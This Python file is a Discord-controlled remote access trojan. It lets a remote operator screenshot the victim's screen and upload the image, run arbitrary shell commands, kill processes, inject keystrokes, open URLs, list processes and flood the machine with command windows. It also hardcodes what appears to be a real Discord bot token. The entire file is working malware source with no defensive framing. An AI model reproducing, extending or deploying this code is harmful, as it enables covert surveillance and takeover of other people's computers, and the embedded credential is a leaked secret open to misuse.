import discord
from discord.ext import commands
import asyncio
import pyscreenshot
import os
from psutil import process_iter
from tkinter import messagebox
import webbrowser
import random
from getpass import getuser
import keyboard
userid=getuser()+str(random.randint(123, 321))
bot = commands.Bot(intents = discord.Intents.all(), command_prefix='!')
bot.remove_command('help')

@bot.command()
async def users(ctx):
    await ctx.send(userid)    
@bot.command()
async def screen(ctx, userpc):
    if userid==userpc:          
        abc = pyscreenshot.grab()
        abc.save(fp=f'{os.getenv("TEMP")}\\Screen.jpg')
        abc.close()
        await ctx.send(file=discord.File(f'{os.getenv("TEMP")}\\Screen.jpg'))
   
@bot.command()    
async def killproc(ctx, userpc, proc_name):
    if userid==userpc:  
        for procname in process_iter():
           if procname.name()==proc_name:
            procname.kill()
            
@bot.command()
async def cmd(ctx,userpc, *, arg):
    if userid==userpc:  
        os.system(arg)

@bot.command()
async def msgbox(ctx,userpc, *, arg):
    if userid==userpc:  
        title=str(arg).split('|')[0]
        message=str(arg).split('|')[-1]
        messagebox.showinfo(title=title, message=message)
    
@bot.command()
async def web(ctx, userpc, arg):
    if userid==userpc:  
        webbrowser.open(url=arg,new=1) 
     
@bot.command()
async def cmdbomb(ctx, userpc, kolvo):
    if userid==userpc: 
        for i in range(int(kolvo)):
            os.system("start cmd")
            
@bot.command()
async def press(ctx, userpc, button):
    if userid==userpc:
        keyboard.send(button)
     
@bot.command()        
async def write(ctx, userpc, *, text):
    if userid==userpc:
        keyboard.write(text)
        
@bot.command()        
async def processlist(ctx, username):
    if username == userid:
                proclist = ""
                for pr in process_iter():
                    prcn = pr.name()
                    if prcn != "svchost.exe" and prcn.endswith(".exe"):
                        proclist += f"{prcn[:-4]}\n"
                await ctx.send(proclist)                       
                                                                      
bot.run('MTA1MDEwNjMyNDc5NDQ3NDUwNg.G6Ssmx.s9KT-rNjCg1BTdWvM_5aNp9w6gv_oRMaWdJBls')
